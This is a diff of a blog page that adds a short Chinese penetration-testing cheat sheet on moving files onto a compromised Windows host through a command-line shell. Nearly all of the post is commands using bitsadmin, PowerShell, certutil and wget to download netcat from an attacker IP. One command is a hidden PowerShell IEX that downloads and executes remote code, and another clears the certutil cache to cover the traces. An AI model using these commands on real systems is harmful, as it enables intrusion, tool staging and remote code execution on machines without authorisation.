@@ -399,7 +399,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-08-07 15:30:34'>2020-02-04 16:46</time>
+            Created At : <time class="date" title='Updated At: 2020-08-09 00:50:51'>2020-02-04 16:46</time>
         
     </div>
     <div class="article-meta">
@@ -421,7 +421,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内网渗透–上传与下载"><span class="toc-text">内网渗透–上传与下载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用bitsadmin-进行下载"><span class="toc-text">使用bitsadmin 进行下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用powershell-进行下载"><span class="toc-text">使用powershell 进行下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-certutil-进行下载"><span class="toc-text">使用 certutil 进行下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-WGET-进行下载"><span class="toc-text">使用 WGET 进行下载</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -437,7 +437,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="内网渗透–上传与下载"><a href="#内网渗透–上传与下载" class="headerlink" title="内网渗透–上传与下载"></a>内网渗透–上传与下载</h1><blockquote>
+<p>对于不用直接上传而且只能通过命令行执行的shell，我们可以通过以下的方法对文件进行上传和下载。</p>
+</blockquote>
+<h3 id="使用bitsadmin-进行下载"><a href="#使用bitsadmin-进行下载" class="headerlink" title="使用bitsadmin 进行下载"></a>使用bitsadmin 进行下载</h3><pre><code>下载命令：bitsadmin /transfer n http://172.16.12.128/NC.exe E:\nc.exe</code></pre><h3 id="使用powershell-进行下载"><a href="#使用powershell-进行下载" class="headerlink" title="使用powershell 进行下载"></a>使用powershell 进行下载</h3><pre><code>本地下载：powershell (new-object System.Net.WebClient).DownloadFile(&apos;http://172.16.12.128/NC.exe&apos;,&apos;nc.exe&apos;)
+远程执行：powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://172.16.12.128/NC.exe&apos;))&quot;</code></pre><h3 id="使用-certutil-进行下载"><a href="#使用-certutil-进行下载" class="headerlink" title="使用 certutil 进行下载"></a>使用 certutil 进行下载</h3><pre><code>下载文件：certutil -urlcache -split -f http://172.16.12.128/NC.exe
+删除缓存：certutil -urlcache -split -f http://172.16.12.128/NC.exe delete
+缓存目录：”%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content”</code></pre><h3 id="使用-WGET-进行下载"><a href="#使用-WGET-进行下载" class="headerlink" title="使用 WGET 进行下载"></a>使用 WGET 进行下载</h3><pre><code>上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。
+wget.exe下载：https://eternallybored.org/misc/wget/
+下载命令：wget.exe -O &quot;nc.exe&quot; http://172.16.12.128/NC.exe</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
     </div>
